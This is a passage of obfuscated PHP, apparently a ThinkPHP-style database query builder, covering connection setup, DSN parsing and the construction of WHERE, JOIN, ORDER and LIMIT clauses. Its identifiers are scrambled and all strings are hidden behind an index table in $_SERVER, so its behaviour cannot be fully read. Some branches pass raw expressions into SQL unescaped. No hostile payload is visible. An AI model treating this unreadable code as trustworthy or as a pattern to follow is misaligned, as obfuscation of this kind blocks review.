explode($_SERVER[ºÖÙÂŒäÉê‡][4], $Aƒºöù®ùà); $a¯ˆµÂö•Š = strtoupper(trim($D‚‘ÑÂ[0])); return $a¯ˆµÂö•Š; } private function parseConfig($Eî“ÅÆÂñ¬ = '') { $dôÙ”öäÉç =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!empty($Eî“ÅÆÂñ¬) && is_string($Eî“ÅÆÂñ¬)) { $Eî“ÅÆÂñ¬ = $this->parseDSN($Eî“ÅÆÂñ¬); } elseif (is_array($Eî“ÅÆÂñ¬)) { $Eî“ÅÆÂñ¬ = array_change_key_case($Eî“ÅÆÂñ¬); $Eî“ÅÆÂñ¬ = array($dôÙ”öäÉç[868] => $Eî“ÅÆÂñ¬[$dôÙ”öäÉç[722]], $dôÙ”öäÉç[793] => $Eî“ÅÆÂñ¬[$dôÙ”öäÉç[873]], $dôÙ”öäÉç[794] => $Eî“ÅÆÂñ¬[$dôÙ”öäÉç[874]], $dôÙ”öäÉç[791] => $Eî“ÅÆÂñ¬[$dôÙ”öäÉç[875]], $dôÙ”öäÉç[792] => $Eî“ÅÆÂñ¬[$dôÙ”öäÉç[876]], $dôÙ”öäÉç[17] => $Eî“ÅÆÂñ¬[$dôÙ”öäÉç[877]], $dôÙ”öäÉç[820] => $Eî“ÅÆÂñ¬[$dôÙ”öäÉç[724]], $dôÙ”öäÉç[13] => isset($Eî“ÅÆÂñ¬[$dôÙ”öäÉç[878]]) ? $Eî“ÅÆÂñ¬[$dôÙ”öäÉç[878]] : array()); } elseif (empty($Eî“ÅÆÂñ¬)) { if (think_config($dôÙ”öäÉç[879]) && $dôÙ”öäÉç[723] != strtolower(think_config($dôÙ”öäÉç[880]))) { $Eî“ÅÆÂñ¬ = $this->parseDSN(think_config($dôÙ”öäÉç[879])); } else { $Eî“ÅÆÂñ¬ = array($dôÙ”öäÉç[868] => think_config($dôÙ”öäÉç[880]), $dôÙ”öäÉç[793] => think_config($dôÙ”öäÉç[881]), $dôÙ”öäÉç[794] => think_config($dôÙ”öäÉç[882]), $dôÙ”öäÉç[791] => think_config($dôÙ”öäÉç[883]), $dôÙ”öäÉç[792] => think_config($dôÙ”öäÉç[884]), $dôÙ”öäÉç[17] => think_config($dôÙ”öäÉç[239]), $dôÙ”öäÉç[820] => think_config($dôÙ”öäÉç[879]), $dôÙ”öäÉç[13] => think_config($dôÙ”öäÉç[885])); } } return $Eî“ÅÆÂñ¬; } protected function initConnect($bÌé™ã“¼¡ = true) { if (1 == think_config($_SERVER[ºÖÙÂŒäÉê‡][18])) { $this->_linkID = $this->multiConnect($bÌé™ã“¼¡); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($dº—‰¥«Ø = false) { $CíÍÕµÌ£ =& $_SERVER[ºÖÙÂŒäÉê‡]; static $Fµäƒò‹Ó³ = array(); if (empty($Fµäƒò‹Ó³)) { foreach ($this->config as $dˆôæäŞĞ‚ => $fÉíù‹ìà) { $Fµäƒò‹Ó³[$dˆôæäŞĞ‚] = explode($CíÍÕµÌ£[47], $fÉíù‹ìà); } } if (think_config($CíÍÕµÌ£[886])) { if ($dº—‰¥«Ø) { $E –×§ã¢ğ = floor(mt_rand(0, think_config($CíÍÕµÌ£[887]) - 1)); } else { if (is_numeric(think_config($CíÍÕµÌ£[888]))) { $E –×§ã¢ğ = think_config($CíÍÕµÌ£[888]); } else { $E –×§ã¢ğ = floor(mt_rand(think_config($CíÍÕµÌ£[887]), count($Fµäƒò‹Ó³[$CíÍÕµÌ£[791]]) - 1)); } } } else { $E –×§ã¢ğ = floor(mt_rand(0, count($Fµäƒò‹Ó³[$CíÍÕµÌ£[791]]) - 1)); } $c˜ùõ™ˆŠÁ = array($CíÍÕµÌ£[793] => isset($Fµäƒò‹Ó³[$CíÍÕµÌ£[793]][$E –×§ã¢ğ]) ? $Fµäƒò‹Ó³[$CíÍÕµÌ£[793]][$E –×§ã¢ğ] : $Fµäƒò‹Ó³[$CíÍÕµÌ£[793]][0], $CíÍÕµÌ£[794] => isset($Fµäƒò‹Ó³[$CíÍÕµÌ£[794]][$E –×§ã¢ğ]) ? $Fµäƒò‹Ó³[$CíÍÕµÌ£[794]][$E –×§ã¢ğ] : $Fµäƒò‹Ó³[$CíÍÕµÌ£[794]][0], $CíÍÕµÌ£[791] => isset($Fµäƒò‹Ó³[$CíÍÕµÌ£[791]][$E –×§ã¢ğ]) ? $Fµäƒò‹Ó³[$CíÍÕµÌ£[791]][$E –×§ã¢ğ] : $Fµäƒò‹Ó³[$CíÍÕµÌ£[791]][0], $CíÍÕµÌ£[792] => isset($Fµäƒò‹Ó³[$CíÍÕµÌ£[792]][$E –×§ã¢ğ]) ? $Fµäƒò‹Ó³[$CíÍÕµÌ£[792]][$E –×§ã¢ğ] : $Fµäƒò‹Ó³[$CíÍÕµÌ£[792]][0], $CíÍÕµÌ£[17] => isset($Fµäƒò‹Ó³[$CíÍÕµÌ£[17]][$E –×§ã¢ğ]) ? $Fµäƒò‹Ó³[$CíÍÕµÌ£[17]][$E –×§ã¢ğ] : $Fµäƒò‹Ó³[$CíÍÕµÌ£[17]][0], $CíÍÕµÌ£[820] => isset($Fµäƒò‹Ó³[$CíÍÕµÌ£[820]][$E –×§ã¢ğ]) ? $Fµäƒò‹Ó³[$CíÍÕµÌ£[820]][$E –×§ã¢ğ] : $Fµäƒò‹Ó³[$CíÍÕµÌ£[820]][0], $CíÍÕµÌ£[13] => isset($Fµäƒò‹Ó³[$CíÍÕµÌ£[13]][$E –×§ã¢ğ]) ? $Fµäƒò‹Ó³[$CíÍÕµÌ£[13]][$E –×§ã¢ğ] : $Fµäƒò‹Ó³[$CíÍÕµÌ£[13]][0]); return $this->connect($c˜ùõ™ˆŠÁ, $E –×§ã¢ğ); } public function parseDSN($cã¤Ä¢Ï†à) { $dÓ¿áÇÙå =& $_SERVER[ºÖÙÂŒäÉê‡]; if (empty($cã¤Ä¢Ï†à)) { return !1; } $f‹×Ïëæ = parse_url($cã¤Ä¢Ï†à); if ($f‹×Ïëæ[$dÓ¿áÇÙå[164]]) { $dŒ’†óÄ = array($dÓ¿áÇÙå[868] => $f‹×Ïëæ[$dÓ¿áÇÙå[164]], $dÓ¿áÇÙå[793] => isset($f‹×Ïëæ[$dÓ¿áÇÙå[539]]) ? $f‹×Ïëæ[$dÓ¿áÇÙå[539]] : $dÓ¿áÇÙå[33], $dÓ¿áÇÙå[794] => isset($f‹×Ïëæ[$dÓ¿áÇÙå[889]]) ? $f‹×Ïëæ[$dÓ¿áÇÙå[889]] : $dÓ¿áÇÙå[33], $dÓ¿áÇÙå[791] => isset($f‹×Ïëæ[$dÓ¿áÇÙå[165]]) ? $f‹×Ïëæ[$dÓ¿áÇÙå[165]] : $dÓ¿áÇÙå[33], $dÓ¿áÇÙå[792] => isset($f‹×Ïëæ[$dÓ¿áÇÙå[166]]) ? $f‹×Ïëæ[$dÓ¿áÇÙå[166]] : $dÓ¿áÇÙå[33], $dÓ¿áÇÙå[17] => isset($f‹×Ïëæ[$dÓ¿áÇÙå[75]]) ? substr($f‹×Ïëæ[$dÓ¿áÇÙå[75]], 1) : $dÓ¿áÇÙå[33]); } else { preg_match($dÓ¿áÇÙå[890], trim($cã¤Ä¢Ï†à), $Bâ­—ÑÉ˜Ÿ); $dŒ’†óÄ = array($dÓ¿áÇÙå[868] => $Bâ­—ÑÉ˜Ÿ[1], $dÓ¿áÇÙå[793] => $Bâ­—ÑÉ˜Ÿ[2], $dÓ¿áÇÙå[794] => $Bâ­—ÑÉ˜Ÿ[3], $dÓ¿áÇÙå[791] => $Bâ­—ÑÉ˜Ÿ[4], $dÓ¿áÇÙå[792] => $Bâ­—ÑÉ˜Ÿ[5], $dÓ¿áÇÙå[17] => $Bâ­—ÑÉ˜Ÿ[6]); } $dŒ’†óÄ[$dÓ¿áÇÙå[820]] = $dÓ¿áÇÙå[33]; return $dŒ’†óÄ; } protected function debug() { $BšÈöß› =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $BšÈöß›[891]; if (think_config($BšÈöß›[892])) { think_status($BšÈöß›[893]); think_trace($this->queryStr . $BšÈöß›[894] . think_status($BšÈöß›[20], $BšÈöß›[893], 6) . $BšÈöß›[895], $BšÈöß›[33], $BšÈöß›[896]); } } protected function parseLock($B«©¾æ¤Õˆ = false) { $e’´²¿«®Ã =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$B«©¾æ¤Õˆ) { return $e’´²¿«®Ã[33]; } if ($e’´²¿«®Ã[822] == $this->dbType) { return $e’´²¿«®Ã[897]; } return $e’´²¿«®Ã[898]; } protected function parseSet($b‡¢Ú£º‡æ) { $EÁÇÑ‡Îø³ =& $_SERVER[ºÖÙÂŒäÉê‡]; foreach ($b‡¢Ú£º‡æ as $f®Ÿö¥àë => $eŒ¶‚Ğ¢Œì) { if (is_array($eŒ¶‚Ğ¢Œì) && $EÁÇÑ‡Îø³[290] == $eŒ¶‚Ğ¢Œì[0]) { $dòÇŞ²ºÔÉ[] = $this->parseKey($f®Ÿö¥àë) . $EÁÇÑ‡Îø³[899] . $eŒ¶‚Ğ¢Œì[1]; } elseif (is_scalar($eŒ¶‚Ğ¢Œì) || is_null($eŒ¶‚Ğ¢Œì)) { $dòÇŞ²ºÔÉ[] = $this->parseKey($f®Ÿö¥àë) . $EÁÇÑ‡Îø³[899] . $this->parseValue($eŒ¶‚Ğ¢Œì); } } return $EÁÇÑ‡Îø³[900] . implode($EÁÇÑ‡Îø³[47], $dòÇŞ²ºÔÉ); } protected function bindParam($FÕÙäºÀõ, $fì¼àÎ¡Š×) { $this->bind[$_SERVER[ºÖÙÂŒäÉê‡][4] . $FÕÙäºÀõ] = $fì¼àÎ¡Š×; } protected function parseBind($CÃ½‰Ğîô¹) { $CÃ½‰Ğîô¹ = array_merge($this->bind, $CÃ½‰Ğîô¹); $this->bind = array(); return $CÃ½‰Ğîô¹; } function parseKey(&$CŠï­”‹¡å, $aä¢Ş‚à = true) { if ($aä¢Ş‚à) { $CŠï­”‹¡å = $this->parseKeyCheck($CŠï­”‹¡å); } return $CŠï­”‹¡å; } function parseKeyCheck($AŞæò››â«) { $BÌÀİ‘Ÿ®Ï =& $_SERVER[ºÖÙÂŒäÉê‡]; $AŞæò››â« = trim($AŞæò››â«); if (!preg_match($BÌÀİ‘Ÿ®Ï[901], $AŞæò››â«)) { think_exception($BÌÀİ‘Ÿ®Ï[902] . $AŞæò››â«); } return $AŞæò››â«; } protected function parseValue($E·½ì¨åƒØ) { $e‹Â«šùÚ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (is_string($E·½ì¨åƒØ)) { $E·½ì¨åƒØ = $e‹Â«šùÚ[861] . $this->escapeString($E·½ì¨åƒØ) . $e‹Â«šùÚ[861]; } elseif (isset($E·½ì¨åƒØ[0]) && is_string($E·½ì¨åƒØ[0]) && strtolower($E·½ì¨åƒØ[0]) == $e‹Â«šùÚ[290]) { $E·½ì¨åƒØ = $this->escapeString($E·½ì¨åƒØ[1]); } elseif (is_array($E·½ì¨åƒØ)) { $E·½ì¨åƒØ = array_map(array($this, $e‹Â«šùÚ[862]), $E·½ì¨åƒØ); } elseif (is_bool($E·½ì¨åƒØ)) { $E·½ì¨åƒØ = $E·½ì¨åƒØ ? $e‹Â«šùÚ[83] : $e‹Â«šùÚ[472]; } elseif (is_null($E·½ì¨åƒØ)) { $E·½ì¨åƒØ = $e‹Â«šùÚ[99]; } return $E·½ì¨åƒØ; } protected function parseField($DÖ·…Î) { $E“Å·À‡ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (is_string($DÖ·…Î) && strpos($DÖ·…Î, $E“Å·À‡[47])) { $DÖ·…Î = explode($E“Å·À‡[47], $DÖ·…Î); } if (is_array($DÖ·…Î)) { $AœÚŸ‘ñğ´ = array(); foreach ($DÖ·…Î as $cÙ­³‹ÇŠ => $A‹¨ƒèÆ) { if (!is_numeric($cÙ­³‹ÇŠ)) { $AœÚŸ‘ñğ´[] = $this->parseKey($cÙ­³‹ÇŠ) . $E“Å·À‡[903] . $this->parseKey($A‹¨ƒèÆ); } else { $AœÚŸ‘ñğ´[] = $this->parseKey($A‹¨ƒèÆ); } } $Bë±¦Ï¹õç = implode($E“Å·À‡[47], $AœÚŸ‘ñğ´); } elseif (is_string($DÖ·…Î) && !empty($DÖ·…Î)) { $Bë±¦Ï¹õç = $DÖ·…Î; } else { $Bë±¦Ï¹õç = $E“Å·À‡[182]; } return $Bë±¦Ï¹õç; } protected function parseTable($b†Íå»‡ÚÛ) { $A­©íöŒÜô =& $_SERVER[ºÖÙÂŒäÉê‡]; if (is_array($b†Íå»‡ÚÛ)) { $Fƒ¶òÓİã× = array(); foreach ($b†Íå»‡ÚÛ as $F”á—Éß¹ => $CÕÇèŸ©¾ê) { if (!is_numeric($F”á—Éß¹)) { $Fƒ¶òÓİã×[] = $this->parseKey($F”á—Éß¹) . $A­©íöŒÜô[50] . $this->parseKey($CÕÇèŸ©¾ê); } else { $Fƒ¶òÓİã×[] = $this->parseKey($F”á—Éß¹); } } $b†Íå»‡ÚÛ = $Fƒ¶òÓİã×; } elseif (is_string($b†Íå»‡ÚÛ)) { if (strstr($b†Íå»‡ÚÛ, $A­©íöŒÜô[50])) { return $b†Íå»‡ÚÛ; } $b†Íå»‡ÚÛ = explode($A­©íöŒÜô[47], $b†Íå»‡ÚÛ); array_walk($b†Íå»‡ÚÛ, array($this, $A­©íöŒÜô[810])); } return $A­©íöŒÜô[904] . trim(implode($A­©íöŒÜô[905], $b†Íå»‡ÚÛ), $A­©íöŒÜô[816]) . $A­©íöŒÜô[904]; } protected function parseWhere($fœ‘“ØÆë¸) { $c®Ê¯Ş¸ÚŠ =& $_SERVER[ºÖÙÂŒäÉê‡]; $A˜¼…çÑˆÇ = $c®Ê¯Ş¸ÚŠ[33]; if (is_string($fœ‘“ØÆë¸)) { $A˜¼…çÑˆÇ = $fœ‘“ØÆë¸; } else { $EŞØ–ÚÓœ× = isset($fœ‘“ØÆë¸[$c®Ê¯Ş¸ÚŠ[906]]) ? strtoupper($fœ‘“ØÆë¸[$c®Ê¯Ş¸ÚŠ[906]]) : $c®Ê¯Ş¸ÚŠ[33]; if (in_array($EŞØ–ÚÓœ×, array($c®Ê¯Ş¸ÚŠ[907], $c®Ê¯Ş¸ÚŠ[908], $c®Ê¯Ş¸ÚŠ[909]))) { $EŞØ–ÚÓœ× = $c®Ê¯Ş¸ÚŠ[50] . $EŞØ–ÚÓœ× . $c®Ê¯Ş¸ÚŠ[50]; unset($fœ‘“ØÆë¸[$c®Ê¯Ş¸ÚŠ[906]]); } else { $EŞØ–ÚÓœ× = $c®Ê¯Ş¸ÚŠ[910]; } foreach ($fœ‘“ØÆë¸ as $AØŠÊíÔ¿« => $d³ø¨ÀãœÒ) { $A˜¼…çÑˆÇ .= $c®Ê¯Ş¸ÚŠ[270]; if (is_numeric($AØŠÊíÔ¿«)) { $AØŠÊíÔ¿« = $c®Ê¯Ş¸ÚŠ[911]; } if (0 === strpos($AØŠÊíÔ¿«, $c®Ê¯Ş¸ÚŠ[70])) { $A˜¼…çÑˆÇ .= $this->parseThinkWhere($AØŠÊíÔ¿«, $d³ø¨ÀãœÒ); } else { if (!preg_match($c®Ê¯Ş¸ÚŠ[912], trim($AØŠÊíÔ¿«))) { think_exception(think_lang($c®Ê¯Ş¸ÚŠ[913]) . $c®Ê¯Ş¸ÚŠ[4] . $AØŠÊíÔ¿«); } $f®Ïññò½ô = is_array($d³ø¨ÀãœÒ) && isset($d³ø¨ÀãœÒ[$c®Ê¯Ş¸ÚŠ[914]]); $AØŠÊíÔ¿« = trim($AØŠÊíÔ¿«); if (strpos($AØŠÊíÔ¿«, $c®Ê¯Ş¸ÚŠ[276])) { $A‰ƒ¢µç˜ò = explode($c®Ê¯Ş¸ÚŠ[276], $AØŠÊíÔ¿«); $EÓßÎ–ºí¯ = array(); foreach ($A‰ƒ¢µç˜ò as $BÓŒ­‚î‘ => $E¢Ğ‰øÛ¤) { $fÜÜ‚³ä£í = $f®Ïññò½ô ? $d³ø¨ÀãœÒ[$BÓŒ­‚î‘] : $d³ø¨ÀãœÒ; $EÓßÎ–ºí¯[] = $c®Ê¯Ş¸ÚŠ[253] . $this->parseWhereItem($this->parseKey($E¢Ğ‰øÛ¤), $fÜÜ‚³ä£í) . $c®Ê¯Ş¸ÚŠ[809]; } $A˜¼…çÑˆÇ .= implode($c®Ê¯Ş¸ÚŠ[915], $EÓßÎ–ºí¯); } elseif (strpos($AØŠÊíÔ¿«, $c®Ê¯Ş¸ÚŠ[277])) { $A‰ƒ¢µç˜ò = explode($c®Ê¯Ş¸ÚŠ[277], $AØŠÊíÔ¿«); $EÓßÎ–ºí¯ = array(); foreach ($A‰ƒ¢µç˜ò as $BÓŒ­‚î‘ => $E¢Ğ‰øÛ¤) { $fÜÜ‚³ä£í = $f®Ïññò½ô ? $d³ø¨ÀãœÒ[$BÓŒ­‚î‘] : $d³ø¨ÀãœÒ; $EÓßÎ–ºí¯[] = $c®Ê¯Ş¸ÚŠ[253] . $this->parseWhereItem($this->parseKey($E¢Ğ‰øÛ¤), $fÜÜ‚³ä£í) . $c®Ê¯Ş¸ÚŠ[809]; } $A˜¼…çÑˆÇ .= implode($c®Ê¯Ş¸ÚŠ[910], $EÓßÎ–ºí¯); } else { $A˜¼…çÑˆÇ .= $this->parseWhereItem($this->parseKey($AØŠÊíÔ¿«), $d³ø¨ÀãœÒ); } } $A˜¼…çÑˆÇ .= $c®Ê¯Ş¸ÚŠ[271] . $EŞØ–ÚÓœ×; } $A˜¼…çÑˆÇ = substr($A˜¼…çÑˆÇ, 0, -strlen($EŞØ–ÚÓœ×)); } return empty($A˜¼…çÑˆÇ) ? $c®Ê¯Ş¸ÚŠ[33] : $c®Ê¯Ş¸ÚŠ[916] . $A˜¼…çÑˆÇ; } protected function parseWhereItem($bÛÄéö…ì¤, $C—ëƒêêÙŠ) { $C´¥Æ…»Š‹ =& $_SERVER[ºÖÙÂŒäÉê‡]; $D¾ ÚÇŒˆ‰ = $C´¥Æ…»Š‹[33]; if (is_array($C—ëƒêêÙŠ)) { if (is_string($C—ëƒêêÙŠ[0])) { $aö¶‰·Û”æ = strtolower($C—ëƒêêÙŠ[0]); if (in_array($C—ëƒêêÙŠ[0], array($C´¥Æ…»Š‹[899], $C´¥Æ…»Š‹[917], $C´¥Æ…»Š‹[918], $C´¥Æ…»Š‹[919], $C´¥Æ…»Š‹[920], $C´¥Æ…»Š‹[921]))) { $D¾ ÚÇŒˆ‰ .= $bÛÄéö…ì¤ . $C´¥Æ…»Š‹[50] . $C—ëƒêêÙŠ[0] . $C´¥Æ…»Š‹[50] . $this->parseValue($C—ëƒêêÙŠ[1]); } elseif (preg_match($C´¥Æ…»Š‹[922], $C—ëƒêêÙŠ[0])) { $D¾ ÚÇŒˆ‰ .= $bÛÄéö…ì¤ . $C´¥Æ…»Š‹[50] . $this->exp[$aö¶‰·Û”æ] . $C´¥Æ…»Š‹[50] . $this->parseValue($C—ëƒêêÙŠ[1]); } elseif (preg_match($C´¥Æ…»Š‹[923], $C—ëƒêêÙŠ[0])) { if (is_array($C—ëƒêêÙŠ[1])) { $F¹‘ùô¯Œ¯ = isset($C—ëƒêêÙŠ[2]) ? strtoupper($C—ëƒêêÙŠ[2]) : $C´¥Æ…»Š‹[908]; if (in_array($F¹‘ùô¯Œ¯, array($C´¥Æ…»Š‹[907], $C´¥Æ…»Š‹[908], $C´¥Æ…»Š‹[909]))) { $bÊ½Á•Æ†‡ = array(); foreach ($C—ëƒêêÙŠ[1] as $e¬œÕù‰‚) { $bÊ½Á•Æ†‡[] = $bÛÄéö…ì¤ . $C´¥Æ…»Š‹[50] . $this->exp[$aö¶‰·Û”æ] . $C´¥Æ…»Š‹[50] . $this->parseValue($e¬œÕù‰‚); } $D¾ ÚÇŒˆ‰ .= $C´¥Æ…»Š‹[253] . implode($C´¥Æ…»Š‹[50] . $F¹‘ùô¯Œ¯ . $C´¥Æ…»Š‹[50], $bÊ½Á•Æ†‡) . $C´¥Æ…»Š‹[809]; } } else { $D¾ ÚÇŒˆ‰ .= $bÛÄéö…ì¤ . $C´¥Æ…»Š‹[50] . $this->exp[$aö¶‰·Û”æ] . $C´¥Æ…»Š‹[50] . $this->parseValue($C—ëƒêêÙŠ[1]); } } elseif ($C´¥Æ…»Š‹[290] == $aö¶‰·Û”æ) { $D¾ ÚÇŒˆ‰ .= $C´¥Æ…»Š‹[807] . $bÛÄéö…ì¤ . $C´¥Æ…»Š‹[50] . $C—ëƒêêÙŠ[1] . $C´¥Æ…»Š‹[924]; } elseif (preg_match($C´¥Æ…»Š‹[925], $C—ëƒêêÙŠ[0])) { if (isset($C—ëƒêêÙŠ[2]) && $C´¥Æ…»Š‹[290] == $C—ëƒêêÙŠ[2]) { $D¾ ÚÇŒˆ‰ .= $bÛÄéö…ì¤ . $C´¥Æ…»Š‹[50] . $this->exp[$aö¶‰·Û”æ] . $C´¥Æ…»Š‹[50] . $C—ëƒêêÙŠ[1]; } else { if (is_string($C—ëƒêêÙŠ[1])) { $C—ëƒêêÙŠ[1] = explode($C´¥Æ…»Š‹[47], $C—ëƒêêÙŠ[1]); } $c„Š½®®Ûñ = implode($C´¥Æ…»Š‹[47], $this->parseValue($C—ëƒêêÙŠ[1])); $D¾ ÚÇŒˆ‰ .= $bÛÄéö…ì¤ . $C´¥Æ…»Š‹[50] . $this->exp[$aö¶‰·Û”æ] . $C´¥Æ…»Š‹[807] . $c„Š½®®Ûñ . $C´¥Æ…»Š‹[809]; } } elseif (preg_match($C´¥Æ…»Š‹[926], $C—ëƒêêÙŠ[0])) { $e»êóÌİõï = is_string($C—ëƒêêÙŠ[1]) ? explode($C´¥Æ…»Š‹[47], $C—ëƒêêÙŠ[1]) : $C—ëƒêêÙŠ[1]; $D¾ ÚÇŒˆ‰ .= $C´¥Æ…»Š‹[807] . $bÛÄéö…ì¤ . $C´¥Æ…»Š‹[50] . $this->exp[$aö¶‰·Û”æ] . $C´¥Æ…»Š‹[50] . $this->parseValue($e»êóÌİõï[0]) . $C´¥Æ…»Š‹[910] . $this->parseValue($e»êóÌİõï[1]) . $C´¥Æ…»Š‹[271]; } else { think_exception(think_lang($C´¥Æ…»Š‹[913]) . $C´¥Æ…»Š‹[4] . $C—ëƒêêÙŠ[0]); } } else { $Dßò®ˆœë = count($C—ëƒêêÙŠ); $F¨±ò…·å = isset($C—ëƒêêÙŠ[$Dßò®ˆœë - 1]) ? strtoupper($C—ëƒêêÙŠ[$Dßò®ˆœë - 1]) : $C´¥Æ…»Š‹[33]; if (in_array($F¨±ò…·å, array($C´¥Æ…»Š‹[907], $C´¥Æ…»Š‹[908], $C´¥Æ…»Š‹[909]))) { $Dßò®ˆœë = $Dßò®ˆœë - 1; } else { $F¨±ò…·å = $C´¥Æ…»Š‹[907]; } for ($FƒÙĞ¥õö¶ = 0; $FƒÙĞ¥õö¶ < $Dßò®ˆœë; $FƒÙĞ¥õö¶++) { $e»êóÌİõï = is_array($C—ëƒêêÙŠ[$FƒÙĞ¥õö¶]) ? $C—ëƒêêÙŠ[$FƒÙĞ¥õö¶][1] : $C—ëƒêêÙŠ[$FƒÙĞ¥õö¶]; if ($C´¥Æ…»Š‹[290] == strtolower($C—ëƒêêÙŠ[$FƒÙĞ¥õö¶][0])) { $D¾ ÚÇŒˆ‰ .= $C´¥Æ…»Š‹[253] . $bÛÄéö…ì¤ . $C´¥Æ…»Š‹[50] . $e»êóÌİõï . $C´¥Æ…»Š‹[924] . $F¨±ò…·å . $C´¥Æ…»Š‹[50]; } else { $AÎõñåãµ˜ = is_array($C—ëƒêêÙŠ[$FƒÙĞ¥õö¶]) ? $this->exp[strtolower($C—ëƒêêÙŠ[$FƒÙĞ¥õö¶][0])] : $C´¥Æ…»Š‹[899]; if (!$AÎõñåãµ˜ && is_array($C—ëƒêêÙŠ[$FƒÙĞ¥õö¶]) && in_array($C—ëƒêêÙŠ[$FƒÙĞ¥õö¶][0], array($C´¥Æ…»Š‹[899], $C´¥Æ…»Š‹[917], $C´¥Æ…»Š‹[918], $C´¥Æ…»Š‹[919], $C´¥Æ…»Š‹[920], $C´¥Æ…»Š‹[921]))) { $AÎõñåãµ˜ = $C—ëƒêêÙŠ[$FƒÙĞ¥õö¶][0]; } $D¾ ÚÇŒˆ‰ .= $C´¥Æ…»Š‹[253] . $bÛÄéö…ì¤ . $C´¥Æ…»Š‹[50] . $AÎõñåãµ˜ . $C´¥Æ…»Š‹[50] . $this->parseValue($e»êóÌİõï) . $C´¥Æ…»Š‹[924] . $F¨±ò…·å . $C´¥Æ…»Š‹[50]; } } $D¾ ÚÇŒˆ‰ = substr($D¾ ÚÇŒˆ‰, 0, -4); } } else { $D¾ ÚÇŒˆ‰ .= $bÛÄéö…ì¤ . $C´¥Æ…»Š‹[927] . $this->parseValue($C—ëƒêêÙŠ); } return $D¾ ÚÇŒˆ‰; } protected function parseThinkWhere($A¢ÈÁùŒ³ , $A³»µ“ İç) { $A°ç“Â¹Ä× =& $_SERVER[ºÖÙÂŒäÉê‡]; $bÑäœ²ÃÃË = $A°ç“Â¹Ä×[33]; switch ($A¢ÈÁùŒ³ ) { case $A°ç“Â¹Ä×[344]: $bÑäœ²ÃÃË = $A³»µ“ İç; break; case $A°ç“Â¹Ä×[911]: $bÑäœ²ÃÃË = is_string($A³»µ“ İç) ? $A³»µ“ İç : substr($this->parseWhere($A³»µ“ İç), 6); break; case $A°ç“Â¹Ä×[928]: parse_str($A³»µ“ İç, $f™èáç´); if (isset($f™èáç´[$A°ç“Â¹Ä×[906]])) { $f¨Éšõâ§ = $A°ç“Â¹Ä×[50] . strtoupper($f™èáç´[$A°ç“Â¹Ä×[906]]) . $A°ç“Â¹Ä×[50]; unset($f™èáç´[$A°ç“Â¹Ä×[906]]); } else { $f¨Éšõâ§ = $A°ç“Â¹Ä×[910]; } $CŠ·–œ²™Ï = array(); foreach ($f™èáç´ as $fğğó³å‰Î => $C¸Úš‰˜¼—) { $CŠ·–œ²™Ï[] = $this->parseKey($fğğó³å‰Î) . $A°ç“Â¹Ä×[927] . $this->parseValue($C¸Úš‰˜¼—); } $bÑäœ²ÃÃË = implode($f¨Éšõâ§, $CŠ·–œ²™Ï); break; } return $bÑäœ²ÃÃË; } protected function parseLimit($A–µÕÅÕëÄ) { $eî¬»Ÿö×Æ =& $_SERVER[ºÖÙÂŒäÉê‡]; return !empty($A–µÕÅÕëÄ) ? $eî¬»Ÿö×Æ[48] . $A–µÕÅÕëÄ . $eî¬»Ÿö×Æ[50] : $eî¬»Ÿö×Æ[33]; } protected function parseJoin($BÆó‚çÒ¹À) { $Fä„ÛÑÔø¦ =& $_SERVER[ºÖÙÂŒäÉê‡]; $dÅµ‘¦‘™¯ = $Fä„ÛÑÔø¦[33]; if (!empty($BÆó‚çÒ¹À)) { if (is_array($BÆó‚çÒ¹À)) { foreach ($BÆó‚çÒ¹À as $a¶†²àìÔ => $fÕ”ÆÊ×ï) { if (!1 !== stripos($fÕ”ÆÊ×ï, $Fä„ÛÑÔø¦[929])) { $dÅµ‘¦‘™¯ .= $Fä„ÛÑÔø¦[50] . $fÕ”ÆÊ×ï; } else { $dÅµ‘¦‘™¯ .= $Fä„ÛÑÔø¦[930] . $fÕ”ÆÊ×ï; } } } else { $dÅµ‘¦‘™¯ .= $Fä„ÛÑÔø¦[930] . $BÆó‚çÒ¹À; } } $dÅµ‘¦‘™¯ = preg_replace($Fä„ÛÑÔø¦[931], think_config($Fä„ÛÑÔø¦[834]) . $Fä„ÛÑÔø¦[932], $dÅµ‘¦‘™¯); return $dÅµ‘¦‘™¯; } protected function parseOrder($BõŞÉ³¥Ò†) { $DêÍº±£íê =& $_SERVER[ºÖÙÂŒäÉê‡]; if (is_array($BõŞÉ³¥Ò†)) { $fèÔÈÈ¹ÍÛ = array(); foreach ($BõŞÉ³¥Ò† as $c¿ùÀ×êÛ => $AÃãËœ•) { if (is_numeric($c¿ùÀ×êÛ)) { $fèÔÈÈ¹ÍÛ[] = $this->parseKey($AÃãËœ•); } else { $AÃãËœ• = in_array(strtoupper(trim($AÃãËœ•)), array($DêÍº±£íê[933], $DêÍº±£íê[934])) ? $DêÍº±£íê[50] . $AÃãËœ• : $DêÍº±£íê[33]; if (preg_match($DêÍº±£íê[935], $c¿ùÀ×êÛ)) { $fèÔÈÈ¹ÍÛ[] = $this->parseKey($c¿ùÀ×êÛ) . $AÃãËœ•; } else { think_exception($DêÍº±£íê[936] . $c¿ùÀ×êÛ); } } } $BõŞÉ³¥Ò† = implode($DêÍº±£íê[47], $fèÔÈÈ¹ÍÛ); } return !empty($BõŞÉ³¥Ò†) ? $DêÍº±£íê[937] . $BõŞÉ³¥Ò† : $DêÍº±£íê[33]; } protected function parseGroup($Fí¡§Á¬Ÿ) { $aŞÛ›–ÙÍ’ =& $_SERVER[ºÖÙÂŒäÉê‡]; return !empty($Fí¡§Á¬Ÿ) ? $aŞÛ›–ÙÍ’[938] . $Fí¡§Á¬Ÿ : $aŞÛ›–ÙÍ’[33]; } protected function parseHaving($a„ËäÔÏ›) { $FÚ«Àè¤³È =& $_SERVER[ºÖÙÂŒäÉê‡]; return !empty($a„ËäÔÏ›) ? $FÚ«Àè¤³È[939] . $a„ËäÔÏ› : $FÚ«Àè¤³È[33]; } protected function parseComment($F±—ÎÀ½óæ) { $D÷ ‰ğå‰ =& $_SERVER[ºÖÙÂŒäÉê‡]; return !empty($F±—ÎÀ½óæ) ? $D÷ ‰ğå‰[940] . $F±—ÎÀ½óæ . $D÷ ‰ğå‰[941] : $D÷ ‰ğå‰[33]; } protected 